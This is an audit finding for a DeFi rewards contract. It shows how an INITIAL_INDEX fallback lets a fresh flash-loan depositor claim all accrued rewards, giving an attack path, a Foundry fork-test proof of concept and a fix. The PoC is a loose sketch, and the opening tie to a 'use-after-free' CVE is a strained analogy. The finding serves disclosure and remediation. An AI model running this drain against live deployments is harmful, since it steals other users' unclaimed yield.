### Title
Retroactive reward accrual via `INITIAL_INDEX` fallback lets a fresh depositor claim all historical rewards - (File: contracts/RewardsDistributor.sol)

### Summary
The bug class of CVE-2021-4322 (use-after-free — referencing stale/freed state as if it were still valid) maps to `RewardsDistributor._calculateTokenDelta`, which treats a never-seen account's index (`accountIndexOf == 0`) as `INITIAL_INDEX` instead of the current token index. A first-time depositor therefore accrues rewards for the entire period since the reward token speed was set, not since they actually held a balance. Combined with the permissionless `updateBeforeMintOrBurn` entry point and flash-loaned collateral, an unprivileged attacker can drain the reward token balance in one transaction.

### Finding Description
In `_calculateTokenDelta`: [1](#0-0) 

```solidity
_tokenIndex = _tokenState.index;
uint256 _accountIndex = accountIndexOf[token_][account_];

if (_accountIndex == 0 && _tokenIndex > INITIAL_INDEX) {
    _accountIndex = INITIAL_INDEX;
}

uint256 _deltaIndex = _tokenIndex - _accountIndex;
_tokensDelta = token_.balanceOf(account_).wadMul(_deltaIndex);
```

For a new account, `_accountIndex` should be set to the *current* `_tokenIndex` (i.e. accrual starts now). Instead it is reset to `INITIAL_INDEX`, so `_deltaIndex` equals all accrued rewards-per-token since the distributor began tracking the token. The delta is then multiplied by the account's *current* balance.

Two properties make this exploitable by anyone:

- `updateBeforeMintOrBurn` is explicitly callable by anyone ("This function also may be called by anyone to update stored indexes", line 173-175), and `claimRewards(accounts_, tokens_)` is permissionless (lines 150-168). No `onlyPool`/`onlyToken` guard constrains who triggers accrual for a token.
- Accrual uses `balanceOf(account_)` sampled at update time, so a balance obtained via flash-loan collateral → `Pool.deposit` → DepositToken mint counts fully.

Attack path:

1. Flash-loan the collateral underlying (e.g. via Balancer/Aave or the pool's own mechanisms).
2. Call `Pool.deposit(depositToken, amount)` (directly or via `Operator.execute`) to mint DepositToken shares to the attacker. The mint itself calls `updateBeforeMintOrBurn`, which stores `tokensAccruedOf[attacker] += balance * (currentIndex - INITIAL_INDEX)`.
3. Call `RewardsDistributor.claimRewards(attacker, [depositToken])`. `_transferRewardIfEnoughTokens` (lines 248-255) sends `tokensAccruedOf[attacker]` of `rewardToken` whenever the distributor balance covers it.
4. `Pool.withdraw` and repay the flash loan, keeping the harvested reward tokens.

The invariant broken is reward-accrual conservation: rewards emitted over time must be distributed pro-rata to balances held during that time; here a balance held for zero seconds captures the full historical index delta.

### Impact Explanation
Theft of unclaimed yield. All `rewardToken` sitting in the distributor — which represents rewards legitimately accrued by existing depositors/debtors but not yet claimed — can be claimed by a fresh account with a sufficiently large momentary balance. The victim users' `tokensAccruedOf` entries remain, but `_transferRewardIfEnoughTokens` will skip their payouts once the contract is drained, so their yield is permanently stolen (the accrued mapping is only zeroed when a transfer actually succeeds).

### Likelihood Explanation
High. Requires only an unprivileged EOA, a flash loan (or a moderate amount of capital if the historical delta is large enough), and public entry points (`Pool.deposit`, `RewardsDistributor.claimRewards`, or `Operator.execute`). No governor/keeper/oracle involvement, no malicious LayerZero endpoint, no price manipulation. `nonReentrant` on `claimRewards` does not help — the entire exploit is sequential. The `amount_ <= _balance` check only caps the payout at the contract balance, which is precisely what the attacker wants to drain.

### Recommendation
In `_calculateTokenDelta`, initialize a first-time account's index to the current `_tokenIndex` rather than `INITIAL_INDEX` (i.e. `_accountIndex = _tokenIndex`, yielding zero delta on first interaction). If `accountIndexOf == 0` must be distinguished from "accrued at index 0", track an explicit `hasAccrued` flag or seed `accountIndexOf[token][account] = _tokenIndex` on first update. Alternatively, snapshot accrual per-mint inside `DepositToken`/`DebtToken` with a mandatory `onlyToken` guard on `updateBeforeMintOrBurn`/`updateBeforeTransfer` so arbitrary callers cannot trigger accrual against a just-minted balance.

### Proof of Concept
Foundry fork test sketch (Base, using deployed `RewardsDistributor` and a live `msdToken`/DepositToken):

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import "forge-std/Test.sol";

interface IRD {
    function claimRewards(address, address[] memory) external;
    function updateBeforeMintOrBurn(address token_, address account_) external;
    function tokensAccruedOf(address) external view returns (uint256);
    function rewardToken() external view returns (IERC20);
    function tokenStates(IERC20) external view returns (uint224 index, uint32 ts);
}

interface IPool {
    function deposit(IDepositToken depositToken_, uint256 amount_) external;
    function withdraw(IDepositToken depositToken_, uint256 amount_) external;
}

contract RetroactiveRewards is Test {
    function test_drain() public {
        vm.createSelectFork(vm.envString("BASE_RPC"));
        IRD rd = IRD(DISTRIBUTOR);
        IERC20 depositToken = IERC20(MSDEPOSIT_TOKEN);
        IERC20 underlying = IERC20(UNDERLYING);

        address attacker = makeAddr("attacker");
        deal(address(underlying), attacker, 1_000_000e18); // stands in for flash loan

        vm.startPrank(attacker);
        underlying.approve(POOL, type(uint256).max);
        IPool(POOL).deposit(IDepositToken(address(depositToken)), 1_000_000e18);
        // accrual already happened inside mint; force it explicitly too:
        rd.updateBeforeMintOrBurn(depositToken, attacker);

        uint256 accrued = rd.tokensAccruedOf(attacker);
        assertGt(accrued, 0);

        address[] memory toks = new address[](1);
        toks[0] = address(depositToken);
        uint256 balBefore = rd.rewardToken().balanceOf(attacker);
        rd.claimRewards(attacker, toks);
        assertGt(rd.rewardToken().balanceOf(attacker), balBefore);
        vm.stopPrank();
    }
}
```

Equivalent Hardhat flow using the pattern in `test/RewardDistributor.test.ts` (real tokens instead of mocks): after the token index has grown above `DEFAULT_INDEX`, a brand-new account minting DepositToken and then calling `claimRewards` receives `balance * (index - INITIAL_INDEX)` rather than zero.
